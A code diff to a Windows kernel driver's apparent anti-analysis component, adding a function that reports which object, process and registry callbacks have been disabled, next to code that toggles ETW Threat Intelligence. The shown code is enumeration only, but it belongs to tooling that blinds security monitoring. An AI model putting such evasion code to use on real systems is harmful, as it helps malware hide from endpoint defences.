@@ -36,6 +36,60 @@ AntiAnalysisHandler::~AntiAnalysisHandler() {
 
 /*
 * Description:
+* ListDisabledCallbacks copies the type and original address of each disabled callback.
+*
+* Parameters:
+* @callbacks    [_Inout_ IoctlDisabledCallbackList*] -- Output header and entries.
+* @capacity     [_In_ SIZE_T] -- Number of entries the output buffer can hold.
+* @bytesWritten [_Out_ SIZE_T*] -- Bytes returned in the output buffer.
+*
+* Returns:
+* @status [NTSTATUS] -- Success or an error. If capacity is insufficient, success
+*                       returns only the header with the required entry count.
+*/
+_IRQL_requires_max_(APC_LEVEL)
+NTSTATUS AntiAnalysisHandler::ListDisabledCallbacks(_Inout_ IoctlDisabledCallbackList* callbacks,
+	_In_ SIZE_T capacity, _Out_ SIZE_T* bytesWritten) {
+	if (!callbacks || !bytesWritten)
+		return STATUS_INVALID_PARAMETER;
+
+	const SIZE_T headerSize = FIELD_OFFSET(IoctlDisabledCallbackList, Callbacks);
+	*bytesWritten = 0;
+
+	AutoLock obLock(obCallbacks.Lock);
+	AutoLock psLock(psRoutines.Lock);
+	AutoLock cmLock(cmCallbacks.Lock);
+	CallbackList* lists[] = { &obCallbacks, &psRoutines, &cmCallbacks };
+	SIZE_T count = 0;
+
+	for (CallbackList* list : lists) {
+		if (list->Count > static_cast<SIZE_T>(-1) - count)
+			return STATUS_INTEGER_OVERFLOW;
+		count += list->Count;
+	}
+
+	callbacks->Count = count;
+	*bytesWritten = headerSize;
+	if (capacity < count)
+		return STATUS_SUCCESS;
+
+	SIZE_T index = 0;
+	for (CallbackList* list : lists) {
+		for (PLIST_ENTRY current = list->Items->Flink; current != list->Items; current = current->Flink) {
+			const auto item = CONTAINING_RECORD(current, DisabledKernelCallback, Entry);
+			callbacks->Callbacks[index].Type = item->Type;
+			callbacks->Callbacks[index].CallbackAddress = item->CallbackAddress;
+			++index;
+		}
+	}
+
+	callbacks->Count = index;
+	*bytesWritten = headerSize + index * sizeof(IoctlDisabledCallbackEntry);
+	return STATUS_SUCCESS;
+}
+
+/*
+* Description:
 * EnableDisableEtwTI is responsible to enable or disable ETWTI.
 *
 * Parameters:
